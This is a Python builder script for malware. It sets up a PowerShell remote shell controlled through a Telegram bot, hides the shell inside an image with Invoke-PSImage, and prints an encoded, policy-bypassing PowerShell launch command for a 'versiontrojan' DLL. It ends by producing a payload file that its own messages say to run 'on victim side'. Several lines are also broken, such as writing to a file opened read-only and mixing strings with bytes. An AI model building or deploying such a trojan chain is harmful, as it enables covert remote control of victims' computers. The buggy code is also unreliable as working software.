import subprocess
import base64

def cmd(command):
        p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        return p.stdout.read().strip().decode()


def GenFullPayload():
    tele_token = input("Please enter your telegram bot token: ")
    chat_id = input('Please enter chat it of your ')
    path = input('Please enter the path of the folder that contains this program')
    lines = '$apiToken = '+tele_token+'\n'+'$chat_id = '+chat_id+'\n'+'handle-client -apiToken  $apiToken -chat_id $chat_id -update "NotNull"'
    with open(path+'\\telegramShell.ps1','r') as file:
        data = file.readlines()[:-5]
    file.close()
    file = open(path+'\\telegramShell.ps1','w')
    file.write('\n'.join(data)+'\n'+lines)
    file.close()
    print('The script telegramShell.ps1 is now ready.')
    psimage = input('To hide the mallware pleas enter Full path to invoke-PsImage,\n(can be download from in the folowing url:https://github.com/peewpw/Invoke-PSImage/blob/master/Invoke-PSImage.ps1\n-> ')
    image_path = input('Please enter path of an image (you can choose random HD/FullHD image)')
    f = open(psimage,'r')
    data = f.read()
    f.close()
    data += '\nInvoke-PSImage -Script '+path+'\\telegramShell.ps1 '+'-Out '+'PaloadImage.png'+' -Image '+image_path
    f = open(psimage,'r')
    f.write(data)
    print('Processing...')
    command = base64.b64encode('&"'+psimage+'" '.encode('UTF-16LE')).decode()
    stenComm = cmd('powershell -EncodedCommand '+command)
    if 'sel' not in stenComm:
        print(stenComm)
        return
    print('\n============ Step 2 ==============')
    print('PaloadImage.png, that will be the malicious image\nto complete the process please upload the image so we can use  the image from the victim machine')
    url = input('Please enter url to your image: ')
    print("Good, now open the versiontrojan.cpp and past the folowing command\nand replace the contant of system function on line 46")
    command = 'start /min cmd /c powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand '+base64.b64encode(stenComm.encode('UTF-16LE')).decode()
    print('The command:  '+command)
    print('Good, now compile the file to dll.')
    dll = input('Please enter full path of the generated dll: ')
    dllShell = base64.b64encode(open(dll,'r').read())
    file = open(path+'\\payload.ps1','r')
    data = file.readlines()[3:]
    file.close()
    with open(path+'\\payload.ps1','w') as file:
        data = "$dllShell = '"+dllShell+"'\n$url = '"+url+"'\n"+data
    print('The program ended Seccessfuly! the payload located on '+path+'\\payload.ps1, run this file on victim side.')
    
if __name__=='__main__':
    GenFullPayload()
    
    
